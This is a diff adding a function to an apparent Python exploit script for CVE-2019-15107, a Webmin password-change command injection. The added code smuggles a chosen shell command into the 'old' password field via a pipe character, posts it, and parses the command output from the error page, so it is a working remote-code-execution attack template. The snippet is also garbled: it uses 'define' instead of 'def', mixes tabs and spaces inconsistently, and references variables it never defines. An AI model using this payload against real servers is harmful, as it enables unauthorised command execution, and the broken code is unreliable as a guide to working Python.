@@ -39,6 +39,18 @@ vuln_url = url + "/password_change.cgi"
 ##Check for vulnerabilities
 ## If not vuln, exceed, if vulnm give 2 options,
 
+define vuln_check(url,cmd):
+	payload="user=wheel&pam=&expired=2&old=test|%s&new1=wheel&new2=wheel" % cmd
+	r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
+    	if r.status_code ==200 and "The current password is " in r.content :
+		print "%s is vulnerable" % vuln_url
+        	print "\nvuln_url= %s" % vuln_url
+        	m = re.compile(r"<center><h3>Failed to change password : The current password is incorrect(.*)</h3></center>", re.DOTALL)
+        	cmd_result = m.findall(r.content)[0]
+        	print
+        	print "Command Result = %s" % cmd_result
+
+	
 def CVE_2019_15107(url, cmd):
     vuln_url = url + "/password_change.cgi"
     headers = {
